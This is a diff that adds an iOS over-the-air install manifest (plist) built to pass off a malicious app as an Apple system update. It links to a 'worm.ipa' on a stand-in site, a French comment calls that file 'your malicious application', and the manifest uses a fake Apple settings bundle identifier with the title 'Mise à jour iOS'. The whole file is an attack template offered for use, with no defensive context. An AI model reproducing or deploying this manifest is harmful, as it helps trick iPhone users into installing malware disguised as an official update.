@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>items</key>
+    <array>
+        <dict>
+            <key>assets</key>
+            <array>
+                <dict>
+                    <key>kind</key>
+                    <string>software-package</string>
+                    <key>url</key>
+                    <string>https://ton-site.com/worm.ipa</string> 
+                    <!-- L'URL de ton application malveillante -->
+                </dict>
+            </array>
+            <key>metadata</key>
+            <dict>
+                <key>bundleIdentifier</key>
+                <string>com.apple.settings.fakeupdate</string>
+                <key>bundleVersion</key>
+                <string>28.0.1</string>
+                <key>kind</key>
+                <string>software</string>
+                <key>title</key>
+                <string>Mise à jour iOS</string>
+            </dict>
+        </dict>
+    </array>
+</dict>
+</plist>
